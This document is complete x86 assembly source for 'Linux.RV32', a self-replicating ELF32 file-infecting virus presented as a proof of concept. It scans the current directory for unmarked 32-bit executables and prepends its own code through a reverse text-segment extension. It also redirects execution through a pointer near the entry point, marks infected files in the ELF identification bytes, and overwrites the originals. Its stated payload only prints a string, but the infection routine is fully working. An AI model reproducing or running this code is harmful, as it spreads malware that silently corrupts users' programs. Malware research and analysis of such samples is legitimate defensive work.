 
 ;::::::::::::::::::::::::::::::::::::::::::::::::::
 ;::: 		      Linux.RV32 		::::
 ;::::::::::::::::::::::::::::::::::::::::::::::::::
 ;by ulexec
 

 ; Proof of concept of an ELF32 reverse text segment
 ; File infector for x86.
 ; Enjoi!

[BITS 32]
global _start

;---------------------structure definitions---------------------------

struc Elf32_Ehdr
	.e_ident 		resb 	16
	.e_type 		resw 	1
	.e_machine 		resw 	1
	.e_version 		resd 	1
	.e_entry 		resd 	1
	.e_phoff 		resd 	1
	.e_shoff 		resd 	1
	.e_flags 		resd 	1
	.e_ehsize 		resw 	1
	.e_phentsize		resw 	1
	.e_phnum		resw 	1
	.e_shentsize		resw 	1
	.e_shnum 		resw 	1
	.e_shstrndx		resw 	1
endstruc

struc Elf32_Phdr
	.p_type			resd 	1
	.p_offset 		resd 	1
	.p_vaddr 		resd 	1
	.p_paddr 		resd 	1
	.p_filesz		resd 	1
	.p_memsz		resd 	1
	.p_flags		resd 	1
	.p_align		resd 	1	
endstruc

struc Elf32_Dyn
	.d_tag			resd 	1
	.d_val			resd 	1
endstruc

struc dirent32 
	.d_ino			resd 	1	; inode
	.d_off			resd 	1	; offset to this dirent
	.d_reclen		resw 	1	; length of name
	.d_name			resb 	1	; filename
	.d_type			resb 	1	; file type
endstruc

struc stat32
	.st_dev			resd	1
	.st_ino			resw 	1
	.st_mode		resw 	1
	.st_nlink		resd 	1
	.st_uid			resw 	1
	.st_gid			resw 	1
	.st_rdev		resd 	1
	.st_size		resd 	1
endstruc

;-------------------------------- Macros and equalities --------------------------------

%macro	PAGE_ALIGN_UP 1
	mov eax, %1
	mov ebx, 0x1000
	dec ebx
	add eax, ebx
	not ebx
	and eax, ebx
	mov %1, eax
%endmacro

%macro GET_REL_SYM_NDX 1
	shr %1, 8	
%endmacro

O_RDONLY 		equ 		0x0
O_WRONLY		equ		0x1
O_RDWR			equ 		0x2
O_CREAT     		equ     	0x64
O_TRUNC     		equ     	0x200

S_IRUSR 		equ 		400
S_IWUSR 		equ		200
S_IXUSR			equ 		100

S_IRGRP	        	equ 		(S_IRUSR  >> 3)	
S_IWGRP	        	equ 		(S_IWUSR  >> 3)	
S_IXGRP	        	equ 		(S_IXUSR  >> 3)	

SEEK_SET    		equ     	0x0  

MAP_SHARED		equ		0x1		; Share changes 
MAP_PRIVATE		equ		0x2		; Changes are private 
MAP_TYPE		equ		0xf		; Mask for type of mapping 
MAP_FIXED		equ		0x10		; Interpret addr exactly 
MAP_ANONYMOUS		equ		0x20		; don't use a file

PROT_READ		equ		0x1		; page can be read 
PROT_WRITE		equ 		0x2		; page can be written 
PROT_EXEC		equ 		0x4		; page can be executed 
PROT_SEM		equ		0x8		; page may be used for atomic ops 
PROT_NONE		equ		0x0		; page can not be accessed 
PROT_GROWSDOWN		equ	  0x1000000		; mprotect flag: extend change to start of growsdown vma 
PROT_GROWSUP		equ	  0x2000000		; mprotect flag: extend change to end of growsup vma 

PT_NULL			equ 		0x0
PT_LOAD			equ		0x1
PT_DYNAMIC		equ		0x2
PT_INTERP		equ		0x3
PT_NOTE			equ 		0x4
PT_SHLIB		equ		0x5
PT_PHDR			equ 		0x6
PT_TLS			equ 		0x7

DT_JMPREL		equ		0x17
DT_RELSZ		equ		0x12
DT_STRTAB		equ		0x5
DT_SYMTAB		equ		0x6

SYMENT			equ 		0x10
RELENT			equ 		0x8
PHDRENT 		equ 		0x20
DYNENT			equ 		0x8

;-------------------------------- CODE --------------------------------------

section .rv0 progbits exec write

_start:
	call .delta32                           ; computing delta
.delta32:
	pop ebp
	sub ebp, .delta32   

	test ebp, ebp                           ; testing if infector is of first generation
    	jnz .continue_without_unlinking         ; if it is, remove the file from disk
    	mov ebx, esp			        
	add ebx, 4
    	mov ebx, [ebx]				; grab argv[1]
    	mov eax, 10
   	int 0x80				; calling unlink(argv[1])

.continue_without_unlinking:		
	
	mov eax, 125				; foreign code segment is not mapped with writting perms
	lea ebx, [ebp + _start]			; fix that calling mprotect() (only > 1st gens)
	and ebx, 0xfffff000
	mov ecx, 0x1000
	mov edx, PROT_READ
	or  edx, PROT_WRITE
	or  edx, PROT_EXEC
	int 0x80				; calling mprotect(imagebase, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
			
	lea ebx, [ebp + cur_folder]		; opening current directory to start scanning for files to infect
	mov eax, 5
	mov ecx, O_RDONLY
	int 0x80				; calling open('.', 0_RDONLY)
	
	cmp eax, -1				; if we dont have permissions to open directory, just exit
	js .exit32

	push eax				; saving some register context due to mmap syscall large amount of arguments
	push ebp
	
	mov eax, 192				; allocaing anonyous chunk to store some data structures for infection
	mov ebx, 0
	mov ecx, 4096
	mov edx, PROT_READ
	or edx,  PROT_WRITE
	mov esi, MAP_ANONYMOUS
	or esi,  MAP_PRIVATE
	mov edi, -1
	mov ebp, 0
	int 0x80				; calling mmap2(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, NULL)

	cmp eax, -1				; if chunk could not be allocated, just exit
	jz .exit32

	pop ebp									
	mov [ebp + dirent] , eax		; saving chunk address. this will be modified
	mov [ebp + org_dirent] , eax		; this will preserve the original pointer

	pop ebx					; retrieving files from current directory
	mov eax, 141
	mov ecx, [ebp + dirent]
	mov edx, 1024
	int 0x80				; calling getdents(current_dir_fd, dirent_chunk, 1024)
	
	mov eax, 0x6							
	int 0x80				; calling close(current_dir_fd)

.scan_file_names:				; here the infector will scann every file in current directory
	mov eax, [ebp + dirent]
	mov eax, dword [eax + dirent32.d_off]
	cmp eax, 0x0;7fffffff			; last dent entry offset holds the value 0x7fffffff. if that value is reached, all files were scanned
	jz .execute_payload			; therefore execute infector payload

	mov eax, 5				; opening file within current directory
        mov ebx, [ebp + dirent]
	lea ebx, [ebx + dirent32.d_name]
	mov ecx, O_RDWR
	int 0x80				; calling open(filename_addr, O_RDWR)

    	cmp eax, 2				; checking if file descriptor is within range 0 - 2 inclusive. those fd are reserved
	jle .iter_file				; if fd is negative, syscall returned an error, therefore scan next file

	mov [ebp + fd], eax			; store fd of file
	
	mov eax, 3				; reading 52 bytes from file in order to check whether file has a valid e_ident ELF header field
	mov ebx, [ebp + fd]
	mov ecx, [ebp + dirent]
	add ecx, 512
	mov edx, Elf32_Ehdr_size
	int 0x80				; calling read(fd, dest_buff, 52)	

	cmp eax, -1				; if read syscall failed, just scan next file
	js .next_file

	mov esi, [ebp + dirent]			
	add esi, 512
	lodsd
	cmp eax, 0x464c457f			; if file does not start with '\x7fELF', scan next file
	jnz .next_file
    	lodsd
	cmp al, 1
	jnz .next_file                          ; If not ELF32 e_class, scan next file
    	lodsd
    	lodsd
    	test eax, eax				; Infector places the OEP of an infected file in e_ident[12].
    	jnz .next_file				; If this value is not 0, then file is infected, therefore scan next file
    	lodsw
	cmp al, 2               
	jnz .next_file                          ; If not e_type ET_EXEC, scan next file

	mov eax, [esi]				; we want to know the total file size. in order to do that we can use the fstat syscall
	mov eax, 108				
	mov ebx, [ebp + fd]
	mov ecx, [ebp + dirent]
	add ecx, 1000
	int 0x80				; calling fstat(fd, stat_dest_buff)

	cmp eax, -1				; if fstat returned an error, then scan next file
	jz .next_file

	mov eax, [ecx + stat32.st_size]		; saving file size 	
	mov [ebp + elfsz], eax			
	PAGE_ALIGN_UP eax			; calculating page-aligned file size
	mov [ebp + alignfilesz], eax		; saving page-aligned file size

	push ebp				; again, saving some register's context in order to call mmap
	push eax

	mov eax, 192				; at this point, If file is an ELF file, and is not infected, then map file into memory
    	mov ebx, 0
    	pop ecx
    	mov edx, PROT_READ
	or edx,  PROT_WRITE
    	mov esi, MAP_SHARED
    	mov edi, [ebp + fd]
    	mov ebp, 0
    	int 0x80                		; calling mmap2(NULL, page_aligned_size, PROT_READ|PROT_WRITE, PROT_SHARED, fd, NULL)
	
    	pop ebp
	mov [ebp + elf], eax			; storing fd of mapped elf

	cmp eax, -1				; if fd is invalid, scan next file
	jz .next_file

	movzx edx, word [eax + Elf32_Ehdr.e_phnum]; saving number of segments of target ELF file
	movzx ecx, word [eax + Elf32_Ehdr.e_phoff]
	add eax, ecx				; calculating address of program header table

	xor ecx, ecx
	inc cx			        	; initialising program header counter
	
	lea esi, [ebp + target_segments]	; set esi registers to point to array of target segment descriptors we need in order to infect file
	lea edi, [ebp + imagebase]		; set edi to address of first global variable to initialise while finding segment descriptors

.find_segments:					; find segment descriptors
	cmp cx, dx				; checking if all segments from file have been scanned
	jg .next_file				; if they have, just scan next file. current file didnt met requirements for infection (must be dynamically linked)

	mov ebx, [ebp + note]			; checking if variable is note var is 0. if is not, it means that all segment descriptor variables have been collected
	test ebx, ebx
	jnz .collect_dynamic			; if all segment descriptors have been collected, collect dynamic entries

	push eax							
	mov ebx, [eax + Elf32_Phdr.p_offset]
	cmp ebx, 0				; comparing current p_offset of segment
	jz .get_segment				; if offset is 0, it means is the CODE segment. handle it appropiately

	mov bl, byte [eax + Elf32_Phdr.p_type]
	cmp bl, byte [esi]			; checking if segment type is the one we are looking for in segment descriptor table
	jz .get_segment				; if it is, collect segment information
	jmp .iter				; otherwise iterate through program header table

.get_segment:					
	cmp bl, 0				; if segment is not the CODE segment, we are interested in collected their file offsets
	jnz .collect_offset			
	mov eax, [eax + Elf32_Phdr.p_vaddr]	; otherwise collect their p_vaddr field
	jmp .iterate_segments

.collect_offset:
	mov eax, [eax + Elf32_Phdr.p_offset]

.iterate_segments:
	stosd					; if segment descriptor was obtained, store its value
	lodsb					; update index in segment descriptor table

.iter:
	pop eax					; iterating over program header table, by adding offset to next entry
	add eax, PHDRENT
	inc ecx
	jmp .find_segments

.collect_dynamic:				; Once all segment descriptors have been collected, same mechanism applies for dynamic entries
	mov edx, [ebp + elf]
	add edx, [ebp + dynamic]		; calculating offset to dynamic segment within mapped file
	xor eax, eax

.find_dynamic_entries:				; finding dynamic entries
	mov ebx, [ebp + pltrel]			; if this particular var is initialised, it means all dynamic entries were collected
	test ebx, ebx
	jnz .begin_infection			; if all done go to infection stage
	mov al, byte [esi]						
	cmp eax, [edx + Elf32_Dyn.d_tag]	; comparing target descriptor from descriptor table with current dynamic entry descriptor
	jz .collect_entry			; if it matches, collect entry
	jmp .iterate_dynamic			; otherwise, continue iterating

.collect_entry:
	mov eax, [edx + Elf32_Dyn.d_val]	; obtaining value of dynamic entry
	stosd					; storing value
	lodsb					; updating dynamic descriptor table
	jmp .collect_dynamic

.iterate_dynamic:				; iterate trough entries in dynamic segment by adding offset to next entry
	add edx, DYNENT
	jmp .find_dynamic_entries

.begin_infection:				; beginning of infection stage	
	mov eax, [ebp + elf]
	lea ecx, [eax + 12]			
	mov ebx, dword [eax + Elf32_Ehdr.e_entry]
	add ebx, 0x18
	sub ebx, [ebp + imagebase]
	add ebx, eax
	mov edx, dword [ebx]
	mov [ecx], edx                          ; hooking __libc_start_main with payload's entrypoint
	mov ecx, [ebp + imagebase]
	add ecx, Elf32_Ehdr_size
	sub ecx, [ebp + alignfilesz]
	mov [ebx], ecx				; modifying e_ident[12] of mapped elf file to hold its original main function
	
	mov eax, [ebp + elf]
	add eax, [eax + Elf32_Ehdr.e_phoff]
	push eax				; calculating address of program header table
	xor ecx, ecx

        mov eax, 5					; creating a new temporary file in order to craft the infected file
	lea ebx, [ebp + tmp_file]
	mov ecx, O_WRONLY
	or  ecx, O_TRUNC
	or  ecx, O_CREAT
	mov edx, S_IRUSR
	or  edx, S_IWUSR
	or  edx, S_IXUSR
	or  edx, S_IRGRP
	or  edx, S_IWGRP
	int 0x80				; calling open(fd, O_WRONLY|O_TRUNC|O_CREAT, S_IRUSR|IWUSR|IXUSR|IRGRP|IWGRP)
	
	cmp eax, 0
	js .next_file				; if returned file descriptor is negative scan next file

	mov [ebp + tmpfd], eax			; store fd of new temporary file
 	pop eax
	mov esi, eax

	mov eax, [ebp + elf]			
	movzx esi, word [eax + Elf32_Ehdr.e_phnum]; storing number of program headers
	add eax, [eax + Elf32_Ehdr.e_phoff]	; calculating addres of program header table
	xor edi, edi
    	mov ecx, [ebp + alignfilesz]		; mov to ecx the aligned file size of target file

.iter_phdrs:
	cmp di, si				; comparing if all segments have been modified
	jz .export_file				; if they have, jmp to next stage
	cmp dword [eax + Elf32_Phdr.p_offset] , 0
	jz .handle_code_phdr			; if segment is CODE segment, handle it appopiately
	add dword [eax + Elf32_Phdr.p_offset], ecx
	add eax , PHDRENT			; otherwise, for each segment, add to its p_offset field the value of alignfilesz
	inc di					; increase segment counter
	jmp .iter_phdrs

.handle_code_phdr:				; if segment is code segment do the following:
	inc di					; increase segment counter
	mov ebx, [eax + Elf32_Phdr.p_vaddr]		
	test ebx, ebx				; check p_vaddr is not 0. GNU_STACK segment has p_offset 0 and p_vaddr 0. 
	jz .iter_phdrs				; if it is GNU_STACK segment, continue iterating
	add ebx, Elf32_Ehdr_size						
	sub ebx, ecx				; calulating address of infector payload, (new file entry-point)
						; that is:	original_p_vaddr + sizeof(Elf32_ehdr) - alignfilesz
	add dword [eax + Elf32_Phdr.p_memsz],  ecx;	p_memsz += alignfilesz
	add dword [eax + Elf32_Phdr.p_filesz], ecx;	p_filesz += alignfilesz
	sub dword [eax + Elf32_Phdr.p_vaddr],  ecx; p_vaddr -= alignfilesz
	sub dword [eax + Elf32_Phdr.p_paddr],  ecx;	p_paddr -= alignfilesz

	add eax, PHDRENT			; iterating to next segment in program header table					
	jmp .iter_phdrs

.export_file:					; exporting modified ELF file
	mov ebx, [ebp + elf]					
	add dword [ebx + Elf32_Ehdr.e_phoff], ecx; changing program header offset value in ELF header to e_phoff += alignfilesz
    	mov dword [ebx + Elf32_Ehdr.e_shoff], 0	; clearing e_shoff, e_shnum, e_shstrndx value since section headers will be unaligned
	mov dword [ebx + Elf32_Ehdr.e_shnum], 0	; (TODO) align section headers
	mov dword [ebx + Elf32_Ehdr.e_shstrndx], 0
	push ecx 
    
	mov eax, 4				; writing section header to temporal file
	mov ebx, [ebp + tmpfd]
	mov ecx, [ebp + elf]
	mov edx, Elf32_Ehdr_size
	int 0x80				; calling write(tmpfd, elf_buff, 0x32)

    	mov eax, 4				; writing infector code after ELF header
	mov ebx, [ebp + tmpfd]
	lea ecx, [ebp + _start]
	lea edx, [ebp + filesz]
    	test edx, edx						
    	jns .invoke_write
    	sub edx, ebp

.invoke_write:					; calling write(tmpfd, _start, filesz)
	int 0x80	

	mov eax, 19				; seeking to program header table offset in tmp file
	mov ebx, [ebp + tmpfd]
	pop ecx
	add ecx, Elf32_Ehdr_size
	mov edx, SEEK_SET
	int 0x80				; calling lseek(tmpfd, phdr_vaddr, SEEK_SET)
	
	mov eax, 4				; writing rest of the file into temporary file
	mov ebx, [ebp + tmpfd]
	mov ecx, [ebp + elf]
	add ecx, Elf32_Ehdr_size
	mov edx, [ebp + elfsz]
	sub edx, Elf32_Ehdr_size
	int 0x80				; calling write(tmpfd, phdr_off, )

	mov ebx, [ebp + tmpfd]			; tempfile is done, close file descriptor
	mov eax, 0x6
	int 0x80				; calling close(tmpfd)

        mov ebx, [ebp + dirent]			; we want to replace target file with our crafted temp file. we can use syscall rename for that
	lea ebx, [ebx + dirent32.d_name]
	push ebx
        mov eax, 38
	pop ecx
	lea ebx, [ebp + tmp_file] 
	int 0x80				; calling rename(tmpfile, targetfile)
  
.next_file:					; scanning next file
	mov ebx, [ebp + fd]
	mov eax, 0x6
	int 0x80				; calling close(fd)

.iter_file:					; iterating trough dirent struct
	xor ebx, ebx
	mov eax, [ebp + dirent]
	mov bx, word [eax + dirent32.d_reclen]
	add eax, ebx				; adding offset to next field
	mov [ebp + dirent], eax
	jmp .scan_file_names	

.execute_payload:				; after files have been infected, the infector executes an arbitrary payload
						; payload function goes here
	mov eax, 4				; payload is just prints a string to stdout
	mov ebx, 1
	lea ecx , [ebp + payload]
	mov edx, 21
	int 0x80				; calling write(stdout, payload_str, 21)

    	mov eax, 91				; unmapping dirent structure
    	mov ebx, [ebp + org_dirent]
    	mov ecx, 0x1000	
    	int 0x80				; calling munmap(org_dirent, 0x1000)			

	lea eax, [ebp + .delta32]		; obtaining OEP from e_ident_[12] from current file
	and eax, 0xfffff000
	add eax, 12
	mov eax, [eax]
	test eax, eax				; if file is not infected, or in other words, if e_ident[12] == 0
	jz .exit32				; just exit

    	push eax
	xor ebp, ebp
	ret					; pivoting to original main function
	
.exit32:
	mov eax, 1
	mov ebx, eax
	dec ebx
	int 0x80				; calling exit(0)

;-------------------------------- Variables --------------------------------------

payload		db 	"some simple payload!", 0xa, 0x0					; payload string
tmp_file    	db 	'tmp', 0x0								; initial tmp file filename
cur_folder 	db 	'.', 0x0								; current directory string
target_segments db 	0x0, PT_LOAD, PT_DYNAMIC, PT_NOTE, DT_STRTAB, DT_SYMTAB, DT_JMPREL	; descriptor table
dirent 		dd 	0x0									; variables to be filled up on runtime for infection
org_dirent  	dd 	0x0
fd		dd 	0x0
tmpfd		dd 	0x0
elfmagic    	dd 	0x0
elf		dd 	0x0
elfsz		dd 	0x0
phnum		dd 	0x0
imagebase	dd 	0x0
datavaddr	dd 	0x0
dynamic		dd 	0x0
note		dd 	0x0
strtab		dd 	0x0
symtab		dd 	0x0
pltrel		dd 	0x0
alignfilesz 	dd 	0x0
oep         	dd 	0x0
filesz		equ 	($-_start)
